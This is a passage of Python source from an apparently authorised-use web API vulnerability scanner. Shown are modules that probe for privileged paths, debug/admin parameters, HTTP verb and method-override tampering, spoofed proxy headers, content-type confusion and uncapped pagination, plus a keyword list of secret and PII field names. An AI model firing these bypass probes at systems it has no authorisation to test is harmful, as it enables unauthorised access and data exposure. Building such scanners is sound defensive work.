        parsed = urllib.parse.urlparse(url)
        parts = [p for p in parsed.path.split("/") if p]
        if len(parts) < 1 or self._ALREADY_PRIV.search(parsed.path or ""):
            return []
        insert_at = 0
        for i, p in enumerate(parts):
            if re.match(r"^v\d+$", p, re.I) or re.match(r"^\d+\.\d+$", p):
                insert_at = i + 1
                break
        else:
            if parts[0].lower() in ("api", "rest", "gateway", "services"):
                insert_at = 1

        cands: List[Tuple[str, str]] = []
        seen = {url.split("#")[0]}

        def add(new_parts: List[str], desc: str):
            u = self._rebuild(parsed, new_parts)
            if u not in seen:
                seen.add(u)
                cands.append((u, desc))

        for seg in self._PRIV_SEGS:
            add(parts[:insert_at] + [seg] + parts[insert_at:], f"/{seg}/ insert")
        add(["admin"] + parts, "root /admin/")
        if self._ME_TAIL.match(parts[-1]):
            add(parts[:insert_at] + ["admin"] + parts[insert_at:-1], "me → admin collection")
        if len(parts) >= 2 and _is_path_segment_interesting(parts[-1]):
            add(parts[:insert_at] + ["admin"] + parts[insert_at:-1], "admin collection")
        return cands[:6]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if point.get("type") != "endpoint":
            return []
        req = sender.base
        if not self._has_auth(req):
            return []
        if base_resp is None or base_resp.status_code == 401 or base_resp.status_code >= 500:
            return []

        issues: List[Issue] = []

        def accept(r, title, param, payload, evidence, sev="HIGH"):
            if len(issues) >= self.MAX_ISSUES:
                return
            if not self._is_meaningful(r) or self._too_similar(base_resp, r):
                return
            issues.append(Issue(
                sev, title, param, payload, evidence,
                req.url, "endpoint",
                response_snippet=(r.text or "")[:CFG.SNIPPET_LEN],
                confidence="Firm",
            ))

        # ── A. Path BFLA — GET only (never replay write body onto /admin) ──
        for variant, desc in self._bfla_urls(req.url):
            if sender._should_stop() or len(issues) >= self.MAX_ISSUES:
                break
            r = sender.send_raw(method="GET", url=variant, body=None)
            accept(
                r,
                f"{self.NAME} — Privileged Path Accessible",
                "url_path", variant,
                f"{desc}: GET {variant} returned HTTP {getattr(r, 'status_code', '?')} "
                f"with data using the captured user token — confirm the caller "
                f"should not reach this function (OWASP API5)",
            )

        # ── B. Verb tamper — write method → GET (safe read) ───────────────
        if (req.method.upper() in self._WRITE and len(issues) < self.MAX_ISSUES
                and not sender._should_stop()):
            r = sender.send_raw(method="GET", url=req.url, body=None)
            accept(
                r,
                f"{self.NAME} — Verb Tampering (GET)",
                "method", "GET",
                f"Original {req.method} accepted; GET on the same URL also returned "
                f"HTTP {getattr(r, 'status_code', '?')} with data — ACL may be "
                f"method-specific and missing on GET",
                sev="MEDIUM",
            )

        # ── C. Method-override (Verb Tunneling) ─────────────
        if len(issues) < self.MAX_ISSUES:
            override_headers = ("X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override")
            target_methods = []
            if req.method.upper() in {"POST", "PUT", "PATCH"}:
                target_methods = ["GET"]
            elif req.method.upper() == "GET":
                target_methods = ["POST"]

            for target_m in target_methods:
                for hdr in override_headers:
                    if sender._should_stop() or len(issues) >= self.MAX_ISSUES:
                        break
                    h = req.headers.copy()
                    h[hdr] = target_m
                    r = sender.send_raw(headers=h, body=req.body if target_m != "GET" else None)
                    accept(
                        r,
                        f"{self.NAME} — Method Override Honored ({hdr}: {target_m})",
                        hdr, target_m,
                        f"{hdr}: {target_m} on a {req.method} produced HTTP "
                        f"{getattr(r, 'status_code', '?')} with different data — "
                        f"server appears to trust the override header",
                        sev="MEDIUM",
                    )
                if len(issues) < self.MAX_ISSUES and not sender._should_stop():
                    p = urllib.parse.urlparse(req.url)
                    q = p.query + ("&" if p.query else "") + f"_method={target_m}"
                    r = sender.send_raw(url=p._replace(query=q).geturl(), body=req.body if target_m != "GET" else None)
                    accept(
                        r,
                        f"{self.NAME} — Method Override Honored (_method={target_m})",
                        "_method", target_m,
                        f"_method={target_m} on {req.method} returned HTTP "
                        f"{getattr(r, 'status_code', '?')} with different data",
                        sev="MEDIUM",
                    )

        return issues


# ─────────────────────────────────────────────────────────────────────────────
# EXCESSIVE DATA EXPOSURE  (MODULE-25, OWASP API3)
#   Zero extra requests — walks the baseline JSON for high-signal fields that
#   are actually populated. Aligns with OOS schema names; skips bare
#   token/secret/pin. Masked/empty values are not findings.
# ─────────────────────────────────────────────────────────────────────────────
class ExposureScanner:
    KEY  = "exposure"
    NAME = "Excessive Data Exposure"
    MAX_ISSUES = 8
    MAX_DEPTH = 6
    _MASK_RE = re.compile(
        r'^(?:\*+|x{2,}|•+|·+|\[redacted\]|redacted|n/?a|hidden|masked|-)$', re.I)
    _FIELD_NAMES = {
        "password", "passwd", "pwd", "passwordhash", "hashedpassword",
        "apikey", "api_key", "clientsecret", "client_secret",
        "privatekey", "private_key",
        "accesstoken", "access_token", "refreshtoken", "refresh_token",
        "authtoken", "auth_token", "sessiontoken", "session_token",
        "idtoken", "id_token",
        "ssn", "socialsecuritynumber",
        "creditcard", "cardnumber", "cvv", "cvv2",
        "bankaccount", "iban", "routingnumber", "salary",
        "passport", "nationalid", "national_id",
        "dob", "dateofbirth",
        "awssecretaccesskey", "secretaccesskey",
    }
    _FIELD_NORM = {re.sub(r'[-_\s]', '', f.lower()) for f in _FIELD_NAMES}
    _COMPOUND = (
        "password", "passwd", "clientsecret", "privatekey",
        "accesstoken", "refreshtoken", "sessiontoken", "authtoken",
        "creditcard", "cardnumber", "socialsecurity", "bankaccount",
        "secretaccesskey",
    )
    _DENY = {
        "token", "secret", "pin", "otp", "securitycode",
        "nexttoken", "continuationtoken", "pagetoken",
        "csrftoken", "xsrftoken", "requesttoken",
        "secretname", "secrettype", "secretref", "secretreference",
        "tokentype", "tokenurl", "tokenendpoint", "tokenuri",
    }
    _HIGH_NEEDLES = (
        "password", "passwd", "pwd", "secret", "apikey", "privatekey",
        "accesstoken", "refreshtoken", "authtoken", "sessiontoken", "idtoken",
        "ssn", "cvv", "creditcard", "cardnumber", "iban", "bankaccount",
        "passport", "nationalid",
    )

    @staticmethod
    def _norm(name: str) -> str:
        return re.sub(r'[-_\s]', '', str(name).lower())

    @classmethod
    def _is_sensitive_field(cls, name: str) -> bool:
        n = cls._norm(name)
        if not n or n in cls._DENY:
            return False
        if n in cls._FIELD_NORM:
            return True
        if any(needle in n for needle in cls._COMPOUND):
            if any(bad in n for bad in (
                "nexttoken", "pagetoken", "csrftoken", "xsrftoken",
                "secretname", "secrettype", "tokenurl", "tokenendpoint",
            )):
                return False
            return True
        return False

    def _live_value(self, v) -> bool:
        if v is None or isinstance(v, bool) or isinstance(v, (dict, list)):
            return False
        if isinstance(v, str):
            s = v.strip()
            if len(s) < 2 or self._MASK_RE.match(s):
                return False
            return True
        if isinstance(v, (int, float)):
            return True
        return False

    @staticmethod
    def _redact(v) -> str:
        s = str(v)
        if len(s) <= 4:
            return f"**** ({len(s)} chars)"
        return f"{s[:2]}…{s[-2:]} ({len(s)} chars)"

    def _sev(self, name: str) -> str:
        n = self._norm(name)
        if any(k in n for k in self._HIGH_NEEDLES):
            return "HIGH"
        return "MEDIUM"

    def _walk(self, obj, path: str, depth: int, hits: list):
        if depth > self.MAX_DEPTH or len(hits) >= self.MAX_ISSUES:
            return
        if isinstance(obj, dict):
            for k, v in obj.items():
                p = f"{path}.{k}" if path else str(k)
                if self._is_sensitive_field(str(k)) and self._live_value(v):
                    hits.append((p, str(k), v))
                    if len(hits) >= self.MAX_ISSUES:
                        return
                self._walk(v, p, depth + 1, hits)
        elif isinstance(obj, list):
            for i, item in enumerate(obj[:20]):
                self._walk(item, f"{path}[{i}]", depth + 1, hits)

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if point.get("type") != "endpoint":
            return []
        if not base_resp or base_resp.status_code >= 400:
            return []
        try:
            data = json.loads(base_resp.text or "")
        except Exception:
            return []
        if not isinstance(data, (dict, list)):
            return []

        hits: list = []
        self._walk(data, "", 0, hits)
        issues: List[Issue] = []
        for path, key, val in hits:
            issues.append(Issue(
                self._sev(key), self.NAME, path, self._redact(val),
                f"Response JSON field '{path}' is populated with live data "
                f"({self._redact(val)}) — omit secrets/PII from API responses "
                f"(OWASP API3)",
                sender.base.url, "endpoint",
                response_snippet=f'{path} = {self._redact(val)}',
                confidence="Certain",
            ))
        return issues


# ── HIDDEN DEBUG & ADMIN PARAMETERS (NEW MODULE) ─────────────────────────
class DebugParamScanner:
    KEY  = "debug_params"
    NAME = "Hidden Debug & Admin Parameters"

    PROBE_PARAMS = [
        ("debug", "true"),
        ("debug", "1"),
        ("admin", "true"),
        ("admin", "1"),
        ("test", "1"),
        ("show_errors", "1"),
        ("view_as", "admin"),
        ("developer", "1"),
        ("internal", "true"),
        ("enable_trace", "1"),
        ("role", "admin"),
        ("impersonate", "admin"),
    ]

    DEBUG_INDICATORS = [
        r'stack\s?trace', r'traceback\s?\(most\srecent', r'exception\sin\sthread',
        r'sql_query', r'database_query', r'memory_usage', r'heap_dump',
        r'debug_mode\s?=\s?true', r'"debug":\s?true', r'environment_variables',
        r'django\.core', r'laravel\.log', r'express\.js', r'flask_debug',
        r'xdebug', r'zend_monitor', r'var_dump\(', r'print_r\(',
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        issues = []
        if not base_resp:
            return issues
        base_status = base_resp.status_code
        base_len = len(base_resp.text or "")
        base_txt = (base_resp.text or "").lower()

        # 1. Probe query string params
        parsed = urllib.parse.urlparse(sender.base.url)
        orig_q = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        orig_keys = {k.lower() for k, _ in orig_q}

        base_body = getattr(sender.base, "body", None) or getattr(sender.base, "data", None)

        for param_name, param_val in self.PROBE_PARAMS:
            if sender._should_stop():
                break
            if param_name.lower() in orig_keys:
                continue

            new_q = orig_q + [(param_name, param_val)]
            new_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_q)))
            r = sender.send_raw(sender.base.method, new_url, sender.base.headers, body=base_body)
            if not r:
                continue

            # Auth Bypass: 401/403 -> 200
            if base_status in (401, 403) and r.status_code == 200:
                issues.append(Issue(
                    "CRITICAL", f"{self.NAME} (Auth Bypass)",
                    param_name, f"{param_name}={param_val}",
                    f"Authentication bypassed from HTTP {base_status} to 200 by adding debug parameter '{param_name}'",
                    new_url, "query",
                    response_snippet=(r.text or "")[:500],
                    confidence="Certain"
                ))
                return issues

            # Debug Information Leakage
            resp_txt = (r.text or "")
            resp_txt_lower = resp_txt.lower()
            for ind in self.DEBUG_INDICATORS:
                if re.search(ind, resp_txt_lower) and not re.search(ind, base_txt):
                    issues.append(Issue(
                        "HIGH", f"{self.NAME} (Debug Leakage)",
                        param_name, f"{param_name}={param_val}",
                        f"Verbose debug/stack trace exposed via '{param_name}={param_val}' (Pattern: {ind})",
                        new_url, "query",
                        response_snippet=resp_txt[:500],
                        confidence="Certain"
                    ))
                    return issues

            # Significant data expansion (> 35% larger and contains admin/debug hints)
            new_len = len(resp_txt)
            if (r.status_code == base_status == 200
                    and new_len > max(base_len * 1.35, base_len + 150)
                    and any(w in resp_txt_lower for w in ("admin", "privilege", "config", "token", "internal", "metrics"))
                    and not any(w in base_txt for w in ("admin", "privilege", "config", "token", "internal", "metrics"))):
                issues.append(Issue(
                    "MEDIUM", f"{self.NAME} (Behavior Change)",
                    param_name, f"{param_name}={param_val}",
                    f"Response expanded by {new_len - base_len} bytes with internal/privileged fields via '{param_name}'",
                    new_url, "query",
                    response_snippet=resp_txt[:500],
                    confidence="Firm"
                ))
                return issues

        # 2. JSON Body injection (if applicable)
        if base_body:
            try:
                data_str = base_body if isinstance(base_body, str) else base_body.decode("utf-8", "ignore")
                body_json = json.loads(data_str)
                if isinstance(body_json, dict):
                    for param_name, param_val in [("debug", True), ("admin", True), ("test", True), ("role", "admin")]:
                        if sender._should_stop():
                            break
                        if param_name in body_json:
                            continue
                        mod_body = {**body_json, param_name: param_val}
                        r = sender.send_full_json(mod_body)
                        if not r:
                            continue
                        if base_status in (401, 403) and r.status_code == 200:
                            issues.append(Issue(
                                "CRITICAL", f"{self.NAME} (Auth Bypass in JSON)",
                                param_name, json.dumps({param_name: param_val}),
                                f"Privilege bypass: {base_status}→{r.status_code} by injecting JSON field '{param_name}'",
                                sender.base.url, "body_json",
                                response_snippet=(r.text or "")[:500],
                                confidence="Certain"
                            ))
                            return issues
            except Exception:
                pass

        return issues


# ── HTTP METHOD / VERB TAMPERING (NEW MODULE) ─────────────────────────────
class VerbTamperingScanner:
    KEY  = "verb_tampering"
    NAME = "HTTP Method / Verb Tampering"

    TEST_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
    OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override",
        "X-HTTP-Method",
        "X-Method-Override",
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        issues = []
        if not base_resp:
            return issues
        orig_method = sender.base.method.upper()
        base_status = base_resp.status_code
        base_len = len(base_resp.text or "")
        base_body = getattr(sender.base, "body", None) or getattr(sender.base, "data", None)

        # 1. Direct alternate verbs
        for m in self.TEST_METHODS:
            if sender._should_stop():
                break
            if m == orig_method:
                continue
            r = sender.send_raw(m, sender.base.url, sender.base.headers, body=base_body if m in ("POST", "PUT", "PATCH") else None)
            if not r:
                continue

            # Auth Bypass: 401/403 with GET/POST, but alternate verb returns 200
            if base_status in (401, 403) and r.status_code == 200:
                if m == "HEAD":
                    issues.append(Issue(
                        "HIGH", f"{self.NAME} (Auth Bypass via HEAD)",
                        "HTTP Method", m,
                        f"Authorization filter bypassed via HEAD method ({base_status}→200)",
                        sender.base.url, "method",
                        response_snippet=str(r.headers)[:500],
                        confidence="Firm"
                    ))
                else:
                    issues.append(Issue(
                        "CRITICAL", f"{self.NAME} (BFLA / Auth Bypass)",
                        "HTTP Method", m,
                        f"Access control bypassed by switching HTTP verb {orig_method}→{m} (HTTP {base_status}→{r.status_code})",
                        sender.base.url, "method",
                        response_snippet=(r.text or "")[:500],
                        confidence="Certain"
                    ))
                return issues

            # Dangerous verb allowed
            if base_status == 200 and m in ("PUT", "DELETE") and r.status_code in (200, 204) and len(r.text or "") != base_len:
                issues.append(Issue(
                    "MEDIUM", f"{self.NAME} (Dangerous Verb Allowed)",
                    "HTTP Method", m,
                    f"HTTP method {m} accepted with HTTP {r.status_code} — verify state changes / access control",
                    sender.base.url, "method",
                    response_snippet=(r.text or "")[:500],
                    confidence="Tentative"
                ))
                return issues

        # 2. Method Override Header Tampering
        if orig_method in ("GET", "POST"):
            for override_target in ("PUT", "DELETE", "PATCH"):
                if sender._should_stop():
                    break
                for hdr in self.OVERRIDE_HEADERS:
                    hdrs = {**sender.base.headers, hdr: override_target}
                    r = sender.send_raw("POST", sender.base.url, hdrs, body=base_body or "{}")
                    if not r:
                        continue
                    if base_status in (401, 403) and r.status_code == 200:
                        issues.append(Issue(
                            "CRITICAL", f"{self.NAME} (Method Override Bypass)",
                            hdr, f"{hdr}: {override_target}",
                            f"Access control bypassed via method override header {hdr}: {override_target}",
                            sender.base.url, "header",
                            response_snippet=(r.text or "")[:500],
                            confidence="Certain"
                        ))
                        return issues

        return issues


# ── IP SPOOFING & PROXY HEADER BYPASS (NEW MODULE) ─────────────────────────
class IpSpoofingScanner:
    KEY  = "ip_spoofing"
    NAME = "IP Spoofing & Proxy Header Bypass"

    HEADERS_TO_TEST = [
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Remote-Addr", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("Client-IP", "127.0.0.1"),
        ("True-Client-IP", "127.0.0.1"),
        ("Cluster-Client-IP", "127.0.0.1"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        issues = []
        if not base_resp:
            return issues
        base_status = base_resp.status_code
        base_len = len(base_resp.text or "")
        base_txt = (base_resp.text or "").lower()
        base_body = getattr(sender.base, "body", None) or getattr(sender.base, "data", None)

        for hname, hval in self.HEADERS_TO_TEST:
            if sender._should_stop():
                break
            hdrs = {**sender.base.headers, hname: hval}
            r = sender.send_raw(sender.base.method, sender.base.url, hdrs, body=base_body)
            if not r:
                continue

            # Auth / ACL Bypass: 401/403 -> 200
            if base_status in (401, 403) and r.status_code == 200:
                issues.append(Issue(
                    "CRITICAL", f"{self.NAME} (Access Control Bypass)",
                    hname, f"{hname}: {hval}",
                    f"IP/Proxy ACL restriction bypassed from {base_status} to 200 using header '{hname}: {hval}'",
                    sender.base.url, "header",
                    response_snippet=(r.text or "")[:500],
                    confidence="Certain"
                ))
                return issues

            # Check if internal routing altered behavior (e.g. X-Original-URL reached /admin)
            if hname in ("X-Original-URL", "X-Rewrite-URL") and r.status_code == 200:
                resp_txt = (r.text or "")
                if ("admin" in resp_txt.lower() or "dashboard" in resp_txt.lower()) and "admin" not in base_txt:
                    issues.append(Issue(
                        "HIGH", f"{self.NAME} (Internal URL Rewrite)",
                        hname, f"{hname}: {hval}",
                        f"Reverse proxy route rewrite triggered via '{hname}: {hval}'",
                        sender.base.url, "header",
                        response_snippet=resp_txt[:500],
                        confidence="Firm"
                    ))
                    return issues

            # Differential response on 200 endpoints
            if base_status == 200 and r.status_code == 200:
                new_len = len(r.text or "")
                if abs(new_len - base_len) > max(base_len * 0.25, 200):
                    resp_txt = (r.text or "")
                    if any(w in resp_txt.lower() for w in ("internal", "debug", "whitelist", "intranet", "localhost")):
                        issues.append(Issue(
                            "MEDIUM", f"{self.NAME} (Trusted Client Behavior)",
                            hname, f"{hname}: {hval}",
                            f"Header '{hname}: {hval}' altered backend trust level (body diff: {new_len - base_len} bytes)",
                            sender.base.url, "header",
                            response_snippet=resp_txt[:500],
                            confidence="Tentative"
                        ))
                        return issues

        return issues


# ── CONTENT-TYPE & MIME CONFUSION (NEW MODULE) ────────────────────────────
class ContentTypeTamperScanner:
    KEY  = "content_type_tamper"
    NAME = "Content-Type & MIME Confusion"

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        issues = []
        base_body = getattr(sender.base, "body", None) or getattr(sender.base, "data", None)
        if not base_resp or not base_body:
            return issues

        if sender.base.method.upper() not in ("POST", "PUT", "PATCH"):
            return issues

        data_raw = base_body if isinstance(base_body, str) else base_body.decode("utf-8", "ignore")
        base_status = base_resp.status_code
        base_ct = ""
        for k, v in sender.base.headers.items():
            if k.lower() == "content-type":
                base_ct = v.lower()
                break

        # Case A: JSON API endpoint -> test text/plain simple request bypass (bypasses CORS preflight)
        if "json" in base_ct:
            plain_hdrs = {k: v for k, v in sender.base.headers.items() if k.lower() != "content-type"}
            plain_hdrs["Content-Type"] = "text/plain"
            r_plain = sender.send_raw(sender.base.method, sender.base.url, plain_hdrs, body=data_raw)
            if r_plain and r_plain.status_code == base_status and r_plain.status_code in (200, 201, 204):
                issues.append(Issue(
                    "MEDIUM", f"{self.NAME} (CORS Preflight Bypass via text/plain)",
                    "Content-Type", "text/plain",
                    f"JSON endpoint successfully processes requests with 'Content-Type: text/plain' "
                    f"(HTTP {r_plain.status_code}), enabling CORS preflight bypass and Cross-Site Request Forgery (CSRF).",
                    sender.base.url, "header",
                    response_snippet=(r_plain.text or "")[:500],
                    confidence="Firm"
                ))

            # Case B: JSON API -> test XML parser confusion
            try:
                json_obj = json.loads(data_raw)
                if isinstance(json_obj, dict) and json_obj:
                    xml_parts = ["<?xml version=\"1.0\" encoding=\"UTF-8\"?>", "<root>"]
                    for k, v in list(json_obj.items())[:6]:
                        safe_k = re.sub(r'[^a-zA-Z0-9_]', '', str(k)) or "item"
                        xml_parts.append(f"<{safe_k}>{v}</{safe_k}>")
                    xml_parts.append("</root>")
                    xml_payload = "".join(xml_parts)

                    xml_hdrs = {k: v for k, v in sender.base.headers.items() if k.lower() != "content-type"}
                    xml_hdrs["Content-Type"] = "application/xml"
                    r_xml = sender.send_raw(sender.base.method, sender.base.url, xml_hdrs, body=xml_payload)
                    if r_xml:
                        xml_err_patterns = [
                            r'XMLSyntaxError', r'SAXParseException', r'SimpleXMLElement',
                            r'org\.xml\.sax', r'javax\.xml\.parsers', r'libxml',
                            r'DOMDocument', r'XML parsing error'
                        ]
                        for pat in xml_err_patterns:
                            if re.search(pat, r_xml.text or "", re.I):
                                issues.append(Issue(
                                    "HIGH", f"{self.NAME} (Hidden XML Parser Active)",
                                    "Content-Type", "application/xml",
                                    f"JSON endpoint unexpectedly invoked an XML parser: {pat}. Check for XXE vulnerabilities.",
                                    sender.base.url, "header",
                                    response_snippet=(r_xml.text or "")[:500],
                                    confidence="Certain"
                                ))
                                break
            except Exception:
                pass

        return issues


# ── RESOURCE & PAGINATION EXHAUSTION (NEW MODULE) ─────────────────────────
class ResourceExhaustionScanner:
    KEY  = "resource_exhaustion"
    NAME = "Resource & Pagination Exhaustion"

    PAGINATION_KEYWORDS = re.compile(
        r'(^page$|^page_?num$|^page_?no$|limit|offset|skip|per.?page|cursor'
        r'|^start$|^count$|^size$|^num$|^rows$|^length$|^top$|^from$|^take$'
        r'|page.?size|page.?limit|page.?count|result.?size|result.?count)',
        re.I
    )

    PROBES = [
        ("100000", "Massive positive limit"),
        ("9999999", "Extreme positive integer"),
        ("-1", "Negative boundary"),
        ("-99999", "Extreme negative integer"),
        ("1.5", "Floating point limit"),
    ]

    def _test_param(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        issues = []
        pname = point.get("name", "")
        ptype = point.get("type", "")
        pval  = str(point.get("value", ""))

        is_page_param = bool(self.PAGINATION_KEYWORDS.search(pname))
        is_numeric = (ptype in ("query", "body_json") and _value_type(pval) == "numeric")

        if not (is_page_param or is_numeric):
            return issues

        base_status = base_resp.status_code
        base_len = len(base_resp.text or "")

        for payload, desc in self.PROBES:
            if sender._should_stop():
                break
            r = sender.send(point, payload)
            if not r:
                continue

            resp_len = len(r.text or "")
            resp_txt = (r.text or "")

            # 1. Uncapped pagination returning massive dataset (OWASP API4:2023)
            if payload in ("100000", "9999999") and r.status_code == 200:
                if resp_len > max(base_len * 4, 30000) and resp_len > base_len + 15000:
                    issues.append(Issue(
                        "HIGH", f"{self.NAME} (Uncapped Pagination Limit)",
                        pname, payload,
                        f"API parameter '{pname}' accepts uncapped integer limit ({payload}), "
                        f"returning {resp_len} bytes (vs baseline {base_len} bytes). Risk of memory exhaustion / DoS.",
                        sender.base.url, ptype,
                        response_snippet=resp_txt[:500],
                        confidence="Certain"
                    ))
                    return issues

            # 2. Negative pagination integer causing internal server crash or DB error
            if payload.startswith("-"):
                db_err_patterns = [
                    r'SQLSTATE', r'Arithmetic overflow', r'IndexOutOfRangeException',
                    r'NegativeArraySizeException', r'ArgumentOutOfRangeException',
                    r'ValueError.*offset', r'Invalid limit', r'Unhandled exception'
                ]
                for pat in db_err_patterns:
                    if re.search(pat, resp_txt, re.I) and not re.search(pat, base_resp.text or "", re.I):
                        issues.append(Issue(
                            "MEDIUM", f"{self.NAME} (Unhandled Negative Boundary)",
                            pname, payload,
                            f"Negative pagination value '{payload}' triggered backend error: {pat}",
                            sender.base.url, ptype,
                            response_snippet=resp_txt[:500],
                            confidence="Firm"
                        ))
                        return issues

                # 500 crash on negative value when baseline was 200
                if base_status == 200 and r.status_code == 500:
                    issues.append(Issue(
                        "LOW", f"{self.NAME} (Server Error on Negative Value)",
                        pname, payload,
                        f"Server crashed with HTTP 500 when '{pname}' was supplied with negative value '{payload}'",
                        sender.base.url, ptype,
                        response_snippet=resp_txt[:500],
                        confidence="Firm"
                    ))
                    return issues

        return issues

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if not base_resp:
            return []
        ptype = point.get("type", "")
        if ptype == "endpoint":
            issues = []
            parsed = urllib.parse.urlparse(sender.base.url)
            q_list = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
            for qk, qv in q_list:
                if self.PAGINATION_KEYWORDS.search(qk) or _value_type(qv) == "numeric":
                    sub_point = {'type': 'query', 'name': qk, 'value': qv}
                    sub_issues = self._test_param(sender, sub_point, base_resp)
                    if sub_issues:
                        issues.extend(sub_issues)
                        break
            return issues
        else:
            return self._test_param(sender, point, base_resp)


# ─────────────────────────────────────────────────────────────────────────────
# MODULE REGISTRY & SCAN PROFILES
# ─────────────────────────────────────────────────────────────────────────────
_ALL_MODULES: Dict[str, object] = {
    "sqli":                SQLiScanner(),
    "nosqli":              NoSQLiScanner(),
    "xss":                 XSSScanner(),
    "lfi":                 LFIScanner(),
    "cmdi":                CMDiScanner(),
    "ssrf":                SSRFScanner(),
    "redirect":            OpenRedirectScanner(),
    "crlf":                CRLFScanner(),
    "xxe":                 XXEScanner(),
    "ssti":                SSTIScanner(),
    "idor":                IDORScanner(),
    "jwt":                 JWTScanner(),
    "massassign":          MassAssignmentScanner(),
    "cors":                CORSScanner(),
    "graphql":             GraphQLScanner(),
    "prototype_pollution": PrototypePollutionScanner(),
    "hpp":                 HPPScanner(),
    "xpath":               XPathScanner(),
    "ldap":                LDAPiScanner(),
    "deserial":            DeserializationScanner(),
    "ratelimit":           RateLimitScanner(),
    "smuggling":           RequestSmugglingScanner(),
    "api_version":         ApiVersionScanner(),
    "hosthdr":             HostHeaderScanner(),
    "csrf":                CSRFScanner(),
    "authz":               AuthzScanner(),
    "exposure":            ExposureScanner(),
    "debug_params":        DebugParamScanner(),
    "verb_tampering":      VerbTamperingScanner(),
    "ip_spoofing":         IpSpoofingScanner(),
    "content_type_tamper": ContentTypeTamperScanner(),
    "resource_exhaustion": ResourceExhaustionScanner(),
}

# ARCH-02: Scan profile presets
SCAN_PROFILES = {
    'passive':   ['exposure'],  # headers + live JSON PII/secrets (0 extra requests)
    'quick':     ['sqli', 'xss', 'ssrf', 'lfi', 'cors', 'debug_params'],
    'full':      None,  # all modules (default)
    'api':       ['sqli', 'nosqli', 'idor', 'massassign', 'jwt', 'cors',
                  'graphql', 'hpp', 'prototype_pollution', 'ratelimit',
                  'smuggling', 'api_version', 'hosthdr', 'csrf', 'authz',
                  'exposure', 'debug_params', 'verb_tampering', 'ip_spoofing',
                  'content_type_tamper', 'resource_exhaustion'],
    'injection': ['sqli', 'nosqli', 'xss', 'cmdi', 'ssti', 'xxe',
                  'xpath', 'ldap', 'lfi'],
}

# Endpoint-level modules (not per-insertion-point)
_ENDPOINT_MODULES = {'cors', 'graphql', 'prototype_pollution', 'massassign',
                     'ratelimit', 'smuggling', 'api_version', 'hosthdr', 'csrf',
                     'authz', 'exposure', 'debug_params', 'verb_tampering',
                     'ip_spoofing', 'content_type_tamper'}

SEV_ORDER = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
SEV_COLOR = {
    'CRITICAL': Fore.RED + Style.BRIGHT, 'HIGH': Fore.RED,
    'MEDIUM':   Fore.YELLOW,             'LOW':  Fore.CYAN,
    'INFO':     Fore.WHITE,
}

BANNER = (
    f"\n{Fore.RED}"
    "  ╔═╗╔═╗╔╦╗╦╦  ╦╔═╗╔═╗╔═╗╔═╗╔╗╔  ╔═╗╦═╗╔═╗\n"
    "  ╠═╣║   ║ ║╚╗╔╝║╣ ╚═╗║  ╠═╣║║║  ╠═╝╠╦╝║ ║\n"
    "  ╩ ╩╚═╝ ╩ ╩ ╚╝ ╚═╝╚═╝╚═╝╩ ╩╝╚╝  ╩  ╩╚═╚═╝\n"
    f"{Style.RESET_ALL}"
    f"{Fore.YELLOW}  v2.0 · Context-Aware · WAF-Aware · OWASP Aligned{Style.RESET_ALL}\n"
    f"{Fore.RED}  ⚠  Use ONLY on targets you own or have permission to test!{Style.RESET_ALL}\n"
)


# ─────────────────────────────────────────────────────────────────────────────
# HTML REPORT (ARCH-07: enhanced with request/response evidence)
# ─────────────────────────────────────────────────────────────────────────────
def gen_html_report(req: ScanRequest, issues: List[Issue],
                    scan_time: float, waf_info: str = "") -> str:
    SEV_HEX = {
        'CRITICAL': '#ff4444', 'HIGH': '#ff8800',
        'MEDIUM':   '#ffcc00', 'LOW':  '#44aaff', 'INFO': '#888888',
    }
    sorted_issues = sorted(issues, key=lambda x: SEV_ORDER.get(x.severity, 99))
    counts = Counter(i.severity for i in issues)

    rows_html = ""
    for idx, iss in enumerate(sorted_issues, 1):
        col = SEV_HEX.get(iss.severity, '#888')
        detail_html = ""
        if iss.response_snippet:
            detail_html = f"""
<tr class="ir-detail" data-sev="{iss.severity}" style="display:none">
  <td colspan="6" style="padding:0 12px 12px 40px">
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:11px">
      <div style="color:#8b949e;margin-bottom:4px;font-weight:600">📋 Response Snippet</div>
      <pre style="white-space:pre-wrap;word-break:break-all;color:#79c0ff;margin:0">{_html.escape(iss.response_snippet)}</pre>
    </div>
  </td>
</tr>"""
        rows_html += f"""
<tr class="ir" data-sev="{iss.severity}" onclick="toggleDetail(this)" style="cursor:pointer">
  <td style="color:#555;font-size:11px">{idx}</td>
  <td><span style="background:{col}22;color:{col};border:1px solid {col}55;
       padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700">{iss.severity}</span></td>
  <td style="font-weight:600">{_html.escape(iss.vulnerability)}</td>
  <td><code style="color:#ffa657">{_html.escape(iss.parameter)}</code>
      <span style="color:#555;font-size:10px"> [{_html.escape(iss.param_type)}]</span></td>
  <td><code style="color:#79c0ff;word-break:break-all;font-size:11px">{_html.escape(iss.payload[:80])}</code></td>
  <td style="color:#8b949e;font-size:11px">{_html.escape(iss.evidence)}</td>
</tr>{detail_html}"""

    cards_html = ""
